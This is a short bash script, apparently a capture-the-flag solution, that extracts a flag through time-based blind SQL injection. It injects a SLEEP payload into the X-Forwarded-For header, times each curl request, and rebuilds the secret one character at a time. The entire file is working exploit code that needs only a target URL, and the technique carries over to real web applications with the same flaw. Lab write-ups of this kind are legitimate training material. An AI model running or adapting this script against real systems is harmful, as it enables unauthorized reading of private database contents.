#!/bin/bash

# Prompt for the Room IP (or URL)
read -p "Enter the Room IP (URL): " url

# List of characters to try for each position in the flag
characterlist="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}:"

# Initialize flag and counter
flag=""
counter=1

# Infinite loop to extract flag
while true; do
    for i in $(echo $characterlist | fold -w1); do
        # Construct the payload with the current character
        # here the main logig is it is asking from "flag" table a single chracter by subtracting with
        # SUBSTR(string, start_position, length)
        # Example SELECT SUBSTR('Hello, World!', 1, 5) AS result;
        # result: Hello
        payload="1' AND (SELECT sleep(2) FROM flag WHERE SUBSTR(flag,${counter},1) = '${i}') AND '1'='1"

        # Send the request using curl and measure the time it takes
        start=$(date +%s.%N)
        response=$(curl -s -o /dev/null -w "%{time_total}" -H "X-Forwarded-For:$payload" "$url")
        end=$(date +%s.%N)
        elapsed=$(echo "$end - $start" | bc)

        # If the request took longer than 2 seconds, it indicates a match
        if (( $(echo "$elapsed >= 2" | bc -l) )); then
            flag+="$i"
            counter=$((counter + 1))
            break
        fi
    done

    # Print the current flag
    echo "$flag"

    # If the flag is long enough, exit
    if [[ ${#flag} -ge 43 ]]; then
        echo "The Flag is: $flag"
        exit 0
    fi
done
